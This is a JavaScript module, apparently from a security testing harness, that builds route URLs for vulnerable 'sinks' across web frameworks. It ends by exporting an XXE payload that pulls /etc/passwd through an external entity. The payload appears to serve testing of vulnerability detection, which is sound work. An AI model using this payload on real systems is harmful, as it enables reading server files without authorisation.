'use strict';

const { kebabCase, reduce } = require('lodash');

const frameworkMapping = require('./frameworkMapping');
const routes = require('./routes');

/**
 * Builds the urls for a given rule
 *
 * @param {object}   opts
 * @param {object[]} opts.sinks   list of applicable sinks
 * @param {string}   opts.key     relevant key on req object
 * @param {string}   opts.baseUri the base URI to use when constructing urls
 * @param {string}   opts.method  the method being handled
 */
function viewData({ sinks, key, baseUri, method }) {
  return sinks.map((sink) => {
    const { code, lib } = sink;
    // Use function if object otherwise use string value
    // This is done after the code and lib
    sink = sink.function || sink;
    return {
      url: `${baseUri}/${key}/${kebabCase(sink)}`,
      uri: `/${key}/${kebabCase(sink)}`, // hapi uses relative urls
      key,
      method,
      sink,
      code,
      lib
    };
  });
}

module.exports.buildUrls = viewData;

/**
 * @param {string} vuln      the vulnerability/sink being tested (ssrf, xss, etc)
 * @param {string} framework the framework being used (express, koa, etc)
 * @return {object}          an object containing viewData arrays per input type
 */
module.exports.getViewData = function getViewData(vuln, framework) {
  const { base, inputs, sinks } = routes[vuln];

  return reduce(
    inputs,
    (dataKeyedByInput, input) => {
      const { method, key } = frameworkMapping[framework][input];
      const data = viewData({ sinks, key, baseUri: base, method });

      return Object.assign(dataKeyedByInput, { [input]: data });
    },
    {}
  );
};

module.exports.attackXml = `
<!DOCTYPE read-fs [<!ELEMENT read-fs ANY >
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<users>
  <user>
    <read-fs>&passwd;</read-fs>
    <name>C.K Frode</name>
  </user>
</users>`;
